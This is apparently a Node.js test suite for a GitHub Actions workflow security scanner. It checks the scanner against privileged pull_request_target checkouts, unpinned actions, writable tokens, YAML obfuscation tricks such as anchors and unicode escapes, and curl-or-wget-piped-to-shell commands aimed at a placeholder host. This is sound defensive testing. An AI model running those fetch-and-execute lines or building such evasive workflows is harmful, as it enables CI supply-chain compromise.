'use strict';
const test=require('node:test'),assert=require('node:assert/strict');
const {inspectWorkflow}=require('./ultra_sentinel_yaml_ast.cjs');
const SHA='a'.repeat(40);
const ref='${{ github.head_ref }}';
const prNumber='${{ github.event.pull_request.number }}';
const checkout=(action='actions/checkout@'+SHA,refValue=ref)=>
 'jobs:\n  audit:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: '+action+'\n        with:\n          ref: '+refValue+'\n';
const safeAction='jobs:\n  audit:\n    steps:\n      - uses: actions/checkout@'+SHA+'\n        with:\n          ref: main\n';
const run=(cmd)=>'on: push\njobs:\n  audit:\n    steps:\n      - run: '+cmd+'\n';
const cases=[];
const add=(title,src,status,rule)=>cases.push({title,src,status,rule});
for(const [name,trigger] of [
 ['plain','on: pull_request_target\n'],
 ['double-quoted','"on": "pull_request_target"\n'],
 ['single-quoted',"'on': 'pull_request_target'\n"],
 ['unicode-key','"\\u006fn": pull_request_target\n'],
 ['flow-trigger','on: {pull_request_target: {types: [opened]}}\n'],
 ['flow-list','on: [push, pull_request_target]\n'],
 ['block-list','on:\n  - push\n  - pull_request_target\n'],
 ['anchored','on: &trigger pull_request_target\n'],
 ['aliased','trigger: &safeEvent pull_request_target\non: *safeEvent\n'],
 ['folded','on: >-\n  pull_request_target\n'],
 ['indent-indicator','on: >2-\n  pull_request_target\n'],
 ['indented-root','  on: pull_request_target\n']
])add('privileged event '+name,
 name==='indented-root'?'  on: pull_request_target\n'+checkout().split('\n').map(row=>row?'  '+row:row).join('\n'):trigger+checkout(),
 'REVIEW_REQUIRED','PRIVILEGED_PR_CODE_CHECKOUT');
for(const [name,trigger] of [
 ['push','on: push\n'], ['pull-request','on: pull_request\n'],
 ['workflow-dispatch','on: workflow_dispatch\n'], ['issues','on: issues\n'],
 ['release','on: release\n'], ['schedule','on: schedule\n'],
 ['flow-push','on: [push, workflow_dispatch]\n'],
 ['map-push','on: {push: {branches: [main]}}\n'],
 ['quoted-push','"on": "push"\n'],
 ['indented-push','  on: push\n']
])add('benign event '+name,trigger+checkout(),'REVIEW_REQUIRED','PRIVILEGED_PR_CODE_CHECKOUT_NEGATIVE');
for(const [name,action,refValue] of [
 ['unpinned tag','actions/checkout@v6','main'],
 ['unpinned version','actions/setup-node@v4','main'],
 ['unpinned branch','actions/checkout@main','main'],
 ['unpinned semver','vendor/action@1.2.3','main'],
 ['pr head', 'actions/checkout@'+SHA,'${{ github.head_ref }}'],
 ['pr head sha','actions/checkout@'+SHA,'${{ github.event.pull_request.head.sha }}'],
 ['pr merge numeric','actions/checkout@'+SHA,'refs/pull/123/merge'],
 ['pr head numeric','actions/checkout@'+SHA,'refs/pull/123/head'],
 ['pr merge dynamic','actions/checkout@'+SHA,'refs/pull/'+prNumber+'/merge'],
 ['pr format dynamic','actions/checkout@'+SHA,'${{ format("refs/pull/{0}/merge", github.event.pull_request.number) }}'],
 ['quoted checkout','"actions/checkout@'+SHA+'"','${{ github.head_ref }}'],
 ['anchored checkout','&chosen actions/checkout@'+SHA,'${{ github.head_ref }}']
])add('action attack '+name,'on: pull_request_target\n'+checkout(action,refValue),'REVIEW_REQUIRED',
 name.startsWith('unpinned')?'UNPINNED_ACTION':'PRIVILEGED_PR_CODE_CHECKOUT');
for(const [name,value,expected] of [
 ['read-only','contents: read',null],
 ['contents-write','contents: write','PRIVILEGED_WRITE_TOKEN'],
 ['id-token-write','id-token: write','PRIVILEGED_WRITE_TOKEN'],
 ['packages-write','packages: write','PRIVILEGED_WRITE_TOKEN'],
 ['security-events-write','security-events: write','PRIVILEGED_WRITE_TOKEN'],
 ['write-all','write-all','PRIVILEGED_WRITE_TOKEN'],
 ['flow-write','{contents: write, issues: read}','PRIVILEGED_WRITE_TOKEN'],
 ['unicode-value','{contents: "\\u0077rite"}','PRIVILEGED_WRITE_TOKEN'],
 ['anchored-write','{contents: &danger write}','PRIVILEGED_WRITE_TOKEN'],
 ['all-read','read-all',null]
])add('permissions '+name,'on: push\npermissions: '+(value.includes(':')&&!value.startsWith('{')&&!value.startsWith('read-all')?'\n  '+value:value)+'\n'+safeAction,expected?'REVIEW_REQUIRED':'NO_RISK_PATTERN',expected);
for(const [name,cmd,expected] of [
 ['curl-bash','curl -fsSL https://example.invalid/payload | bash',true],
 ['wget-sh','wget -qO- https://example.invalid/payload | sh',true],
 ['curl-pipe-amp','curl https://example.invalid/payload |& bash',true],
 ['wget-pipe-amp','wget https://example.invalid/payload |& sh',true],
 ['curl-benign','curl https://example.invalid/payload > saved.txt',false],
 ['bash-no-fetch','echo hello | bash',false],
 ['safe-echo','echo hello',false],
 ['safe-install','printf safe',false],
 ['checkout-echo','echo actions/checkout@v6',false],
 ['safe-pipe','printf safe | cat',false]
])add('shell '+name,run(cmd),expected?'REVIEW_REQUIRED':'NO_RISK_PATTERN',expected?'REMOTE_SHELL_PIPELINE':null);
for(const [name,yml] of [
 ['tab-indent','on: push\njobs:\n\tbad:\n    steps: []\n'],
 ['duplicate-root','on: push\non: pull_request_target\njobs: {}\n'],
 ['unknown-tag','on: !unknown push\njobs: {}\n'],
 ['unclosed-flow','on: [push, workflow_dispatch\njobs: {}\n'],
 ['root-array','- on: push\n- jobs: {}\n'],
 ['scalar-root','"on: push"\n'],
 ['jobs-string','on: push\njobs: not-a-map\n'],
 ['steps-map','on: push\njobs:\n  x:\n    steps: {uses: actions/checkout@v6}\n'],
 ['boolean-on','on: true\njobs: {}\n'],
 ['empty-source',''],
 ['invalid-tab-key','on: push\njobs:\n  x:\n    steps:\n      \t- uses: actions/checkout@v6\n'],
 ['cyclic-alias','on: push\njobs:\n  x: &loop {steps: *loop}\n']
])add('parse rejection '+name,yml,'INCOMPLETE',null);
for(const {title,src,status,rule} of cases){
 test('AST adversarial: '+title,()=>{
  const r=inspectWorkflow(src);
  if(rule==='PRIVILEGED_PR_CODE_CHECKOUT_NEGATIVE'){
   assert.ok(!r.findings.some(f=>f.rule==='PRIVILEGED_PR_CODE_CHECKOUT'),JSON.stringify(r));return;
  }
  assert.equal(r.status,status,JSON.stringify(r));
  if(rule)assert.ok(r.findings.some(f=>f.rule===rule),JSON.stringify(r));
  if(status==='INCOMPLETE')assert.equal(r.coverage.partial,true);
 });
}
test('AST matrix guarantees at least 50 independent YAML traps',()=>{
 assert.ok(cases.length>=50,String(cases.length));
});

test('AST production wiring: parse each trusted Sentinel workflow without source execution',()=>{
 const fs=require('node:fs'),path=require('node:path');
 for(const filename of [
  'ultra-sentinel-auto-review.yml',
  'ultra-sentinel-core-check.yml',
  'ultra-sentinel-independent-review.yml',
  'ultra-sentinel-self-review.yml',
  'ultra-sentinel-mutation.yml',
  'ultra-sentinel-reliability-100.yml',
  'ultra-sentinel-sss-post-ci.yml'
 ]){
  const full=path.resolve(__dirname,'../workflows',filename);
  const content=fs.readFileSync(full,'utf8');
  const verdict=inspectWorkflow(content,{path:'.github/workflows/'+filename});
  assert.notEqual(verdict.status,'INCOMPLETE',
   filename+': '+JSON.stringify(verdict));
 }
});
test('AST safety: BOM at root is recognized without skipping privileged trigger',()=>{
 const content='\ufeffon: pull_request_target\njobs:\n  audit:\n    steps:\n'+
  '      - uses: actions/checkout@'+SHA+
  '\n        with:\n          ref: ${{ github.head_ref }}';
 const verdict=inspectWorkflow(content);
 assert.ok(verdict.findings.some(f=>f.rule==='PRIVILEGED_PR_CODE_CHECKOUT'),
  JSON.stringify(verdict));
});

test('AST merge <<: *alias inherits dangerous checkout and ref instead of masking it',()=>{
 const yaml=['on: pull_request_target',
 'shared: &checkout {uses: "actions/checkout@'+SHA+'", with: {ref: "${{ github.head_ref }}"}}',
 'jobs:','  audit:','    steps:','      - <<: *checkout'].join('\n');
 const r=inspectWorkflow(yaml);
 assert.ok(r.findings.some(f=>f.rule==='PRIVILEGED_PR_CODE_CHECKOUT'),JSON.stringify(r));
});
test('AST merge <<: *alias inherits writable permissions and never claims safe',()=>{
 const yaml=['on: push', 'base: &writer {contents: write}',
 'permissions:', '  <<: *writer', 'jobs:','  test:','    steps:','      - run: echo safe'].join('\n');
 const r=inspectWorkflow(yaml);
 assert.ok(r.findings.some(f=>f.rule==='PRIVILEGED_WRITE_TOKEN')||r.coverage.partial,
 JSON.stringify(r));
});
test('AST step alias resolves concrete checkout rather than skipping steps',()=>{
 const yaml=['on: pull_request_target','jobs:','  test:','    steps:',
 '      - &source {uses: "actions/checkout@'+SHA+'", with: {ref: "${{ github.head_ref }}"}}',
 '      - *source'].join('\n');
 const r=inspectWorkflow(yaml);
 assert.ok(r.findings.some(f=>f.rule==='PRIVILEGED_PR_CODE_CHECKOUT'),JSON.stringify(r));
});
test('AST unknown tag is incomplete and cannot be executed',()=>{
 const yaml='on: push\njobs:\n  demo:\n    steps:\n      - uses: !javascript/object actions/checkout@v6\n';
 const r=inspectWorkflow(yaml);
 assert.equal(r.status,'INCOMPLETE');
});
test('AST excessively large untrusted YAML fails closed',()=>{
 const src='on: push\njobs: {}\n#'+('x'.repeat(160001));
 const r=inspectWorkflow(src);
 assert.equal(r.status,'INCOMPLETE');
 assert.equal(r.coverage.partial,true);
});
test('AST numeric ref in checkout is not silently treated as a trusted branch',()=>{
 const y='on: pull_request_target\njobs:\n  t:\n    steps:\n      - uses: actions/checkout@'+SHA+
 '\n        with:\n          ref: 100\n';
 const r=inspectWorkflow(y);
 assert.equal(r.status,'INCOMPLETE',JSON.stringify(r));
});
test('AST missing on trigger does not claim a healthy workflow',()=>{
 const r=inspectWorkflow('jobs:\n  t:\n    steps:\n      - run: echo hi\n');
 assert.equal(r.status,'INCOMPLETE',JSON.stringify(r));
});
